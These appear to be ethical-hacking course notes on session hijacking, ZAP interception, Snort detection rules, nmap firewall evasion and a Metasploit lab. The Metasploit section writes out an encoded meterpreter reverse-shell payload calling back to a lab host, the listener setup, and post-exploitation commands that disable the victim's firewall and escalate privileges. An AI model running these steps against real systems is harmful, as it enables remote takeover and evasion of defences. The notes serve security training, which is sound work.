# 10 - Session Hijacking

#### <mark style="color:orange;">**Module 10 - Session Hijacking**</mark>

<details>

<summary>What is a Session Hijacking?</summary>

**Session Hijacking**, also known as session fixation or session theft, is a type of security attack where an unauthorized person gains access to a legitimate user's session on a web application. In this attack, the attacker takes control of an active user's session, allowing them to impersonate the user and perform actions on their behalf. This can lead to various security breaches and unauthorized activities.

Session hijacking typically occurs in web applications that use session management to maintain user authentication and track user interactions. Here's how a session hijacking attack works:

1. **Session Creation**: When a user logs into a web application, the server creates a unique session for that user. A session ID is generated and associated with the user's authentication.
2. **Session ID Exposure**: The session ID is typically stored as a cookie on the user's device or included in URLs. It is used to identify the user for subsequent requests.
3. **Attacker's Actions**: The attacker attempts to obtain the user's session ID. This can be done through various means, such as intercepting network traffic, stealing cookies, or tricking the user into revealing their session ID through social engineering or phishing.
4. **Session Hijacking**: Once the attacker acquires the legitimate session ID, they can use it to impersonate the user. They send requests to the web application using the stolen session ID, and the server, recognizing the session ID as valid, treats the requests as if they were coming from the legitimate user.
5. **Unauthorized Actions**: The attacker can now perform actions on the web application as if they were the victim. Depending on the application's security and the permissions associated with the user's session, this can lead to unauthorized activities, such as changing account settings, making fraudulent transactions, or stealing sensitive information.

To mitigate session hijacking, web developers and application owners should implement security measures such as:

1. **Secure Session Management**: Ensure that session IDs are generated securely, are sufficiently random, and have a short lifespan. This reduces the window of opportunity for attackers to hijack a session.
2. **Use HTTPS**: Secure communication with the web application using HTTPS to encrypt data in transit, making it more difficult for attackers to intercept session IDs.
3. **Secure Cookies**: If session IDs are stored as cookies, mark them as secure and HTTP-only to prevent JavaScript from accessing them and transmitting them over unencrypted connections.
4. **Session Regeneration**: Regenerate session IDs after login, authentication changes, or privilege elevation to make it harder for attackers to predict session IDs.
5. **IP Validation**: Implement IP address validation to ensure that sessions are only valid when accessed from the same IP address.
6. **Session Timeout**: Implement session timeouts and automatic logouts to limit the duration of active sessions.

</details>

### OWASP Zed Attack Proxy (ZAP)

* First set Victim’s Proxy settings to attacker’s IP and port 8080.
* Open ZAP and enable Break Point and click green + to view break points
* Go to settings -> local Proxies -> Change IP from localhost to network IP (in this case 10.10.10.16).
* Browse from victim and view the request and responses on the attacker machine.

{% content-ref url="../tools/zap.md" %}
[zap.md](../tools/zap.md)
{% endcontent-ref %}

## Evading IDS Firewalls and Honeypots

### Snort - Intrusion Detection

#### ICMP Detection Rule

* Open C:\Snort\rules\icmp-info.rules.
* Type alert icmp $EXTERNAL\_NET any -> $HOME\_NET 10.10.10.12 (msg:"ICMP-INFO PING"; icode:0; itype:8; reference:arachnids,135; reference:cve,1999-0265; classtype:bad-unknown; sid:472; rev:7;) in Line 21.
* Save the file.

#### Start Snort in IDS mode

* Open cmd in C:Snort and Type snort -iX -A console -c C:\Snort\etc\snort.conf -l C:\Snort\log -K ascii | here X=1 , l is small L

#### Detection

Ping the snort machine and rules will be displayed in cmd

{% embed url="https://www.snort.org/" %}

### Nmap Evasion Techniques – Firewall Rule Bypass

* Enable victim firewall. Create inbound rule and block connection from attacker IP.
* Run different scans from attacker machine. Use Zombie scan to bypass firewall rule. `nmap -sI <Zombie IP><Target IP>`

### Metasploit – Firewall Bypass

#### Payload Setup&#x20;

```bash
msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -e
x86/shikata_ga_nai -b "\x00" LHOST=10.10.10.11 -f exe > Desktop/Exploit.exe #-e encoder, -b list of bad characters to avoid

mkdir /var/www/html/share #make directory
chmod -R 755 /var/www/html/share #change rights recursively to all files and folders inside
chown -R www-data:www-data /var/www/html/share #change owner recursively owner:group
mv /root/Desktop/Test.exe /var/www/html/share #move to exploit
service apache2 start
```

#### Listener Setup

```bash
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 10.10.10.11
#Start listener
exploit -j -z #exploit -j -z exploit tells Metasploit to start the exploit.
#The -j flag tells it to run in the context of a job and -z simply means to not interact with the session once it becomes active.
```

#### Execute Exploit

```bash
#Open http://10.10.10.11/share on victim machine. Download Payload and run.
sessions -i #to view sessions
sessions -i 1 #to interact with the session created
execute -f cmd.exe -c -H #creates a channel to execute the victim command shell
shell #opens an interactive shell (cmd)
netsh firewall show opmode #to shown firewall stats
netsh advfirewall set allprofiles state off #to turn off firewall
getsystem
Type ps #show active processes
```
